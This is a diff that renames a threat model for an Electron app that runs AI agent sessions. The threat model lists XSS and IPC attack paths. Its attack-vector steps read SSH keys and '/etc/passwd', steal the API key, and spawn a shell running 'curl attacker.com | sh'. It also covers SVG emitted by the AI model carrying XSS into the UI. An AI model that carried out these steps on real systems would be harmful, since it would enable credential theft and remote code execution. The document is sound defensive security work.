@@ -1,4 +1,4 @@
-# Threat Model for Droid Control (Utility Pane)
+# Threat Model for DROIDEX (Utility Pane)
 
 **Last Updated:** 2026-07-25
 **Version:** 1.0.0
@@ -12,13 +12,13 @@
 
 ### Architecture Description
 
-Droid Control is an Electron desktop application that allows users to run Factory Droid AI agent sessions, manage mission workspaces, and connect the React UI to a local Droid sidecar process. PR #55 introduced a mission-scoped utility pane that bundles four tools per mission: Review (git diff/PR), Browser (native embedded browser automation), Files (root-confined file browser with preview), and Terminal (PTY-backed xterm.js workspace). The system is built using Electron 39, React 19, TypeScript, Vite, and a Node.js sidecar, and consists of five main components:
+DROIDEX is an Electron desktop application that allows users to run Factory Droid AI agent sessions, manage mission workspaces, and connect the React UI to a local Droid sidecar process. PR #55 introduced a mission-scoped utility pane that bundles four tools per mission: Review (git diff/PR), Browser (native embedded browser automation), Files (root-confined file browser with preview), and Terminal (PTY-backed xterm.js workspace). The system is built using Electron 39, React 19, TypeScript, Vite, and a Node.js sidecar, and consists of five main components:
 
 1. **React Renderer** (`src/`) - The user-facing UI rendered in the Electron BrowserWindow. Contains the conversation view, mission management, onboarding, and the mission-scoped utility pane (Review/Browser/Files/Terminal tabs). Communicates with the main process exclusively through the preload bridge and with the sidecar over a loopback WebSocket.
 
 2. **Electron Main Process** (`electron/main.cjs`) - Owns window lifecycle, the bridge (sidecar) child process, native browser automation of the `<webview>` pages the renderer mounts (each bound to a chat by a one-time token main issues), credential encryption via `safeStorage`, file access registries, terminal PTY management, git/GitHub CLI orchestration, and the app update flow. Exposes ~60 IPC handlers to the renderer.
 
-3. **Electron Preload Scripts** (`electron/preload.cjs`, `electron/nativeBrowserPreload.cjs`) - Narrow `contextBridge` boundaries. The main preload exposes `window.droidControl` with ~50 IPC-backed methods. The native browser preload runs inside arbitrary untrusted web pages loaded in the browser pane and exposes three functions for agent actions, credential fill, and design-state application.
+3. **Electron Preload Scripts** (`electron/preload.cjs`, `electron/nativeBrowserPreload.cjs`) - Narrow `contextBridge` boundaries. The main preload exposes `window.droidex` with ~50 IPC-backed methods. The native browser preload runs inside arbitrary untrusted web pages loaded in the browser pane and exposes three functions for agent actions, credential fill, and design-state application.
 
 4. **Node Sidecar** (`sidecar/src/`) - A local WebSocket server bound to `127.0.0.1` that orchestrates Factory Droid SDK/CLI child processes, manages mission sessions, and proxies browser automation requests to the Electron host. Owns the `MissionManager`, `BrowserSessionManager`, `NativeBrowserRuntime`, and the MCP tool server exposed to the Droid agent.
 
@@ -121,7 +121,7 @@ The app has no traditional user authentication; it is a single-user desktop appl
 
 #### Native Browser Pane (`<webview>` guests)
 
-- **URL navigation** - User-typed or agent-specified URLs loaded into a shared `persist:droid-control-browser` partition
+- **URL navigation** - User-typed or agent-specified URLs loaded into a shared `persist:droidex-browser` partition
   - **Input:** URL strings (http, https, file, about schemes)
   - **Validation:** `validateUrl` scheme allowlist, `rejectHostAppUrl` self-origin block
   - **Risk:** `file:` URLs allow reading local files in the browser; shared persistent partition leaks cookies across missions; no `will-navigate` re-validation after initial load
@@ -200,7 +200,7 @@ The system accepts untrusted input from:
 
 - **Mission transcripts** - `.factory/sessions/*.jsonl` conversation logs with agent outputs, code, and tool results
   - **Why critical:** Contains proprietary user code, prompts, and potentially sensitive agent findings. Parsed via `JSON.parse` without schema validation (tampered transcripts could cause exceptions but not code execution).
-- **Browser session state** - Cookies, localStorage, IndexedDB in `persist:droid-control-browser` partition
+- **Browser session state** - Cookies, localStorage, IndexedDB in `persist:droidex-browser` partition
   - **Why critical:** Shared persistent partition retains all browser cookies/storage across missions and app restarts. A cookie set in mission A persists into mission B.
 - **Git repository contents** - Working trees, branches, commits managed via the Review tab
   - **Why critical:** Source code and potentially committed secrets. Protected by OS filesystem permissions only.
@@ -301,10 +301,10 @@ function validateBridgeAuth(req: IncomingMessage, token: string): boolean {
 **Attack Vector:**
 
 1. Attacker achieves XSS in the renderer (see Threat: Model-Emitted SVG XSS)
-2. Attacker calls `window.droidControl.getApiKey()` to exfiltrate the decrypted API key
-3. Attacker calls `window.droidControl.readFile('/etc/passwd')` or `readFile('/Users/<user>/.ssh/id_rsa')` for arbitrary file read
-4. Attacker calls `window.droidControl.openProject({dir, editor})` to spawn processes
-5. Attacker calls `window.droidControl.setApiKey('attacker-key')` to swap the key
+2. Attacker calls `window.droidex.getApiKey()` to exfiltrate the decrypted API key
+3. Attacker calls `window.droidex.readFile('/etc/passwd')` or `readFile('/Users/<user>/.ssh/id_rsa')` for arbitrary file read
+4. Attacker calls `window.droidex.openProject({dir, editor})` to spawn processes
+5. Attacker calls `window.droidex.setApiKey('attacker-key')` to swap the key
 
 **Code Pattern to Look For:**
 
@@ -630,7 +630,7 @@ Exposing information to users or processes who shouldn't have access.
 3. `SvgCodeBlock` processes it through `safeSvg` -- which only adjusts width/height/xmlns, NOT event handlers or `<script>` tags
 4. The result is injected via `<div dangerouslySetInnerHTML={{ __html: safeSvg }} />`
 5. The `onload` handler fires in the renderer context (React, preload API, WebSocket bridge all accessible)
-6. Attacker calls `window.droidControl.getApiKey()`, `window.droidControl.readFile('/etc/passwd')`, or sends WebSocket commands
+6. Attacker calls `window.droidex.getApiKey()`, `window.droidex.readFile('/etc/passwd')`, or sends WebSocket commands
 
 **Code Pattern to Look For:**
 
@@ -691,7 +691,7 @@ const safeSvg = useMemo(() => {
 **Attack Vector:**
 
 1. Attacker achieves renderer XSS (see Threat: Model-Emitted SVG XSS)
-2. Attacker calls `window.droidControl.readFile('/Users/<user>/.ssh/id_rsa')` or `readFile('/etc/passwd')`
+2. Attacker calls `window.droidex.readFile('/Users/<user>/.ssh/id_rsa')` or `readFile('/etc/passwd')`
 3. The `read-file` handler calls `readFile(filePath)` with no root confinement, no token gate, no sender validation
 4. File contents returned to the compromised renderer
 
@@ -834,11 +834,11 @@ function validateUrl(value) {
 
 #### Threat: Shared Browser Partition Cross-Mission Cookie Leakage
 
-**Scenario:** Cookies and localStorage set in one mission's browser session persist into another mission's browser session (and across app restarts) because all sessions share `persist:droid-control-browser`.
+**Scenario:** Cookies and localStorage set in one mission's browser session persist into another mission's browser session (and across app restarts) because all sessions share `persist:droidex-browser`.
 
 **Vulnerable Components:**
 
-- `electron/main.cjs` (line 48: `const BROWSER_PARTITION = 'persist:droid-control-browser'`; line 673: used by WebContentsView)
+- `electron/main.cjs` (line 48: `const BROWSER_PARTITION = 'persist:droidex-browser'`; line 673: used by WebContentsView)
 
 **Attack Vector:**
 
@@ -851,7 +851,7 @@ function validateUrl(value) {
 ```javascript
 // VULNERABLE: Single shared persistent partition for all missions
 // electron/main.cjs:48
-const BROWSER_PARTITION = 'persist:droid-control-browser';
+const BROWSER_PARTITION = 'persist:droidex-browser';
 ```
 
 ```javascript
@@ -1039,7 +1039,7 @@ const view = new WebContentsView({
 **Attack Vector:**
 
 1. Attacker achieves renderer XSS
-2. Attacker calls `window.droidControl.terminalCreate({missionId, shell: '/bin/sh', args: ['-c', 'curl attacker.com | sh'], cwd: '/'})`
+2. Attacker calls `window.droidex.terminalCreate({missionId, shell: '/bin/sh', args: ['-c', 'curl attacker.com | sh'], cwd: '/'})`
 3. `terminal.cjs` accepts `args.shell` and `args.args` without validation (only checks they are string/array)
 4. Arbitrary process spawned via node-pty with full user privileges
 
@@ -1429,7 +1429,7 @@ Human review is required for:
 
 1. **No Content-Security-Policy** - The main window and browser pane have no CSP. Accepted because `contextIsolation: true` + `nodeIntegration: false` limits XSS damage to the renderer context, but this weakens defense-in-depth. Mitigation timeline: add CSP in a future hardening pass.
 2. **`sandbox: false` on all preloads** - Preloads run with full Node access. Required for current functionality (file I/O, crypto, pty in preload). Accepted because `contextIsolation: true` isolates the preload from page context, but a preload bug could be catastrophic. Mitigation timeline: enable `sandbox: true` for `nativeBrowserPreload.cjs` (highest risk) by refactoring to IPC-only.
-3. **Shared persistent browser partition** - All missions share `persist:droid-control-browser`. Accepted for user convenience (persistent logins). Cross-mission cookie leakage is a known trade-off. Mitigation timeline: add per-mission ephemeral partitions as an option.
+3. **Shared persistent browser partition** - All missions share `persist:droidex-browser`. Accepted for user convenience (persistent logins). Cross-mission cookie leakage is a known trade-off. Mitigation timeline: add per-mission ephemeral partitions as an option.
 4. **Legacy IPC handlers without sender validation** - ~33 handlers skip `assertMainRenderer`. Accepted because there is only one renderer, but this violates defense-in-depth. Mitigation timeline: add `assertMainRenderer` to all privileged handlers.
 5. **`BRIDGE_ALLOW_LOCAL_NO_TOKEN` in dev** - Dev mode allows unauthenticated WebSocket connections. Accepted for development convenience. Packaged builds force `'0'`.
 6. **`file:` URLs in browser pane** - Allowed for local file browsing convenience. Accepted with the understanding that the agent could read local files via the browser. Mitigation timeline: add user consent prompt for `file:` navigation.
